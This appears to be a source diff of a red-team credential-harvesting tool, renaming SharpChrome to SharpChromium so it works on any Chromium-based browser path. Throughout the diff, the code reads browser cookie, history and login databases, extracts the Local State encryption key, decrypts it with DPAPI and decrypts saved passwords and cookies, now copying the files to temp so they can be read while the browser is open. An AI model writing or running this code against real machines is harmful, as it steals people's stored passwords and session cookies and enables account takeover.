@@ -11,17 +11,17 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Data;
 
-namespace SharpChrome
+namespace SharpChromium
 {
-    class ChromeCredentialManager
+    class ChromiumCredentialManager
     {
         internal string userDataPath;
-        internal string userChromeHistoryPath;
-        internal string userChromeBookmarkPath;
-        internal string userChromeCookiesPath;
-        internal string userChromeLoginDataPath;
+        internal string userChromiumHistoryPath;
+        internal string userChromiumBookmarksPath;
+        internal string userChromiumCookiesPath;
+        internal string userChromiumLoginDataPath;
         internal string userLocalStatePath;
-        internal string googleChromePath;
+        internal string chromiumBasePath;
         internal bool useTmpFile = false;
         internal byte[] aesKey = null;
         internal BCrypt.SafeAlgorithmHandle hAlg = null;
@@ -32,28 +32,29 @@ namespace SharpChrome
 
         internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
         internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
-        public ChromeCredentialManager(string[] domains = null)
+        public ChromiumCredentialManager(string basePath, string[] domains = null)
         {
             if (Environment.GetEnvironmentVariable("USERNAME").Contains("SYSTEM"))
-                throw new Exception("Cannot decrypt Chrome credentials from a SYSTEM level context.");
+                throw new Exception("Cannot decrypt Chromium credentials from a SYSTEM level context.");
             if (domains != null && domains.Length > 0)
                 filterDomains = domains;
             string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
             hKey = null;
             hAlg = null;
-            googleChromePath = Path.Combine(localAppData, "Google\\Chrome\\User Data\\Default\\");
-            userChromeHistoryPath = Path.Combine(googleChromePath, "History");
-            userChromeBookmarkPath = Path.Combine(googleChromePath, "Bookmarks");
-            userChromeCookiesPath = Path.Combine(googleChromePath, "Cookies");
-            userChromeLoginDataPath = Path.Combine(googleChromePath, "Login Data");
-            userLocalStatePath = Path.Combine(googleChromePath, "Local State");
-            if (!ChromeDataExists())
-                throw new Exception("User chrome data files not present.");
-            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
-            if (chromeProcesses.Length > 0)
-            {
-                useTmpFile = true;
-            }
+            chromiumBasePath = basePath;
+            userChromiumHistoryPath = chromiumBasePath + "\\Default\\History";
+            userChromiumBookmarksPath = chromiumBasePath + "\\Default\\Bookmarks";
+            userChromiumCookiesPath = chromiumBasePath + "\\Default\\Cookies";
+            userChromiumLoginDataPath = chromiumBasePath + "\\Default\\Login Data";
+            userLocalStatePath = chromiumBasePath + "Local State";
+            if (!Chromium())
+                throw new Exception("User chromium data files not present.");
+            useTmpFile = true;
+            //Process[] chromeProcesses = Process.GetProcessesByName("chrome");
+            //if (chromeProcesses.Length > 0)
+            //{
+            //    useTmpFile = true;
+            //}
             string key = GetBase64EncryptedKey();
             if (key != "")
             {
@@ -61,7 +62,7 @@ namespace SharpChrome
                 aesKey = DecryptBase64StateKey(key);
                 if (aesKey == null)
                     throw new Exception("Failed to decrypt AES Key.");
-                DPAPIChromeAlgKeyFromRaw(aesKey, out hAlg, out hKey);
+                DPAPIChromiumAlgFromKeyRaw(aesKey, out hAlg, out hKey);
                 if (hAlg == null || hKey == null)
                     throw new Exception("Failed to create BCrypt Symmetric Key.");
             }
@@ -198,9 +199,9 @@ namespace SharpChrome
         // You want cookies? Get them here.
         public HostCookies[] GetCookies()
         {
-            string cookiePath = userChromeCookiesPath;
+            string cookiePath = userChromiumCookiesPath;
             if (useTmpFile)
-                cookiePath = Utils.FileUtils.CreateTempDuplicateFile(userChromeCookiesPath);
+                cookiePath = Utils.FileUtils.CreateTempDuplicateFile(userChromiumCookiesPath);
             SQLiteDatabase database = new SQLiteDatabase(cookiePath);
             string query = "SELECT * FROM cookies ORDER BY host_key";
             DataTable resultantQuery = database.ExecuteQuery(query);
@@ -218,7 +219,7 @@ namespace SharpChrome
         public HistoricUrl[] GetHistory()
         {
             HostCookies[] cookies = GetCookies();
-            string historyPath = userChromeHistoryPath;
+            string historyPath = userChromiumHistoryPath;
             if (useTmpFile)
                 historyPath = Utils.FileUtils.CreateTempDuplicateFile(historyPath);
             SQLiteDatabase database = new SQLiteDatabase(historyPath);
@@ -244,7 +245,7 @@ namespace SharpChrome
 
         public SavedLogin[] GetSavedLogins()
         {
-            string loginData = userChromeLoginDataPath;
+            string loginData = userChromiumLoginDataPath;
             if (useTmpFile)
                 loginData = Utils.FileUtils.CreateTempDuplicateFile(loginData);
             SQLiteDatabase database = new SQLiteDatabase(loginData);
@@ -257,6 +258,7 @@ namespace SharpChrome
                 byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                 byte[] decBytes = DecryptBlob(passwordBytes);
                 if (decBytes != null)
+                    // https://github.com/djhohnstein/SharpChrome/issues/6
                     password = Encoding.UTF8.GetString(decBytes);
                 if (password != String.Empty)
                 {
@@ -271,14 +273,14 @@ namespace SharpChrome
 
 
 
-        private bool ChromeDataExists()
+        private bool Chromium()
         {
             string[] paths =
             {
-                userChromeHistoryPath,
-                userChromeCookiesPath,
-                userChromeBookmarkPath,
-                userChromeLoginDataPath,
+                userChromiumHistoryPath,
+                userChromiumCookiesPath,
+                userChromiumBookmarksPath,
+                userChromiumLoginDataPath,
                 userLocalStatePath
             };
             foreach (string path in paths)
@@ -319,16 +321,11 @@ namespace SharpChrome
             return true;
         }
 
-        public static string GetBase64EncryptedKey()
+        public string GetBase64EncryptedKey()
         {
-            string localStatePath = Environment.GetEnvironmentVariable("LOCALAPPDATA");
-            // something weird happened
-            if (localStatePath == "")
+            if (!File.Exists(userLocalStatePath))
                 return "";
-            localStatePath = Path.Combine(localStatePath, "Google\\Chrome\\User Data\\Local State");
-            if (!File.Exists(localStatePath))
-                return "";
-            string localStateData = File.ReadAllText(localStatePath);
+            string localStateData = File.ReadAllText(userLocalStatePath);
             string searchTerm = "encrypted_key";
             int startIndex = localStateData.IndexOf(searchTerm);
             if (startIndex < 0)
@@ -349,7 +346,7 @@ namespace SharpChrome
         }
 
         //kuhl_m_dpapi_chrome_alg_key_from_raw
-        public static bool DPAPIChromeAlgKeyFromRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
+        public static bool DPAPIChromiumAlgFromKeyRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
         {
             bool bRet = false;
             hAlg = null;
